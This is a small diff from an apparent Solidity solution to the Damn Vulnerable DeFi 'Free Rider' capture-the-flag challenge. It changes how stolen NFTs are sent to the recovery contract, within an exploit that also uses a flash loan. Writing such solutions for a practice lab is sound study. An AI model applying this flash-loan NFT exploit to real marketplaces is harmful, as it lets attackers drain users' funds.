@@ -70,7 +70,7 @@ contract FreeRiderAttack is Test, IERC721Receiver, IUniswapV2Callee {
 
         // 4. Sell the NFTs to the buyer
         for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
-            damnValuableNFT.safeTransferFrom(address(this), address(freeRiderRecovery), i);
+            damnValuableNFT.safeTransferFrom(address(this), address(freeRiderRecovery), i, abi.encode(address(this)));
         }
 
         // 5. Repay the flash loan
